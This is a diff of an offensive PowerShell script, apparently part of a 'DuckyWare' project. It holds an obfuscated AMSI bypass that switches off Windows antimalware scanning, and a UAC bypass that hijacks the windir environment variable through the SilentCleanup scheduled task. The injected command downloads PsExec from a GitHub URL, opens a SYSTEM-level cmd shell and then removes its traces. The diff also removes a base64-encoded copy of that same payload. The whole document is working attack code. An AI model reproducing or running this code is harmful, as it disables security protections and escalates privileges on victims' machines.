@@ -1,18 +1,11 @@
 #Line by line amsi bypass 
 
 $amsi=[Ref].Assembly.GetType('S'+'yst'+'em.Ma'+'na'+'gem'+'ent.A'+'u'+'tom'+'atio'+'n.Ams'+'iUt'+'ils')
-$field=amsi.GetField('am'+'siInit'+'Fai'+'led','N'+'on'+'P'+'ub'+'lic,Sta'+'tic')
+$field=$amsi.GetField('am'+'siInit'+'Fai'+'led','N'+'on'+'P'+'ub'+'lic,Sta'+'tic')
 $field.SetValue($null,$true)
 
-JHByb2dyYW0gPSAicG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiB3Z2V0ICdodHRwczovL2dpdGh1Yi5jb20vYjRjazNuZC1kZXYvRHVja3lXYXJlL2Jsb2IvbWFpbi9Qc0V4ZWMuZXhlP3Jhdz10cnVlJyAtT3V0RmlsZSBwc2V4ZWMuZXhlOyAuXHBzZXhlYy5leGUgLXMgLWkgY21kLmV4ZTsgcm0gcHNleGVjLmV4ZTsgZXhpdDsgIyIKU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtDVTpcRW52aXJvbm1lbnQiIC1OYW1lICJ3aW5kaXIiIC1WYWx1ZSAkcHJvZ3JhbSAtRm9yY2UKI0ZvciB4NjQgc2hlbGwgaW4gV2luZG93cyB4NjQ6ClN0YXJ0LVByb2Nlc3Mgc2NodGFza3MuZXhlIC1Bcmd1bWVudExpc3QgIi9SdW4gL1ROIFxNaWNyb3NvZnRcV2luZG93c1xEaXNrQ2xlYW51cFxTaWxlbnRDbGVhbnVwIC9JIgojRm9yIHg4NiBzaGVsbCBpbiBXaW5kb3dzIHg2NDoKI0M6XFdpbmRvd3NcU3lzbmF0aXZlXGNtZC5leGUgL2MgInBvd2Vyc2hlbGwgU3RhcnQtUHJvY2VzcyBzY2h0YXNrcy5leGUgLUFyZ3VtZW50TGlzdCAiL1J1biAvVE4gXE1pY3Jvc29mdFxXaW5kb3dzXERpc2tDbGVhbnVwXFNpbGVudENsZWFudXAgL0kiIgpTdGFydC1TbGVlcCAzCkNsZWFyLUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtDVTpcRW52aXJvbm1lbnQiIC1OYW1lICJ3aW5kaXIiIC1Gb3JjZQ==
-
-
-#############################
 $program = "powershell.exe -WindowStyle Hidden wget 'https://github.com/b4ck3nd-dev/DuckyWare/blob/main/PsExec.exe?raw=true' -OutFile psexec.exe; .\psexec.exe -s -i cmd.exe; rm psexec.exe; exit; #"
 Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value $program -Force
-#For x64 shell in Windows x64:
 Start-Process schtasks.exe -ArgumentList "/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I"
-#For x86 shell in Windows x64:
-#C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process schtasks.exe -ArgumentList "/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I""
 Start-Sleep 3
 Clear-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Force
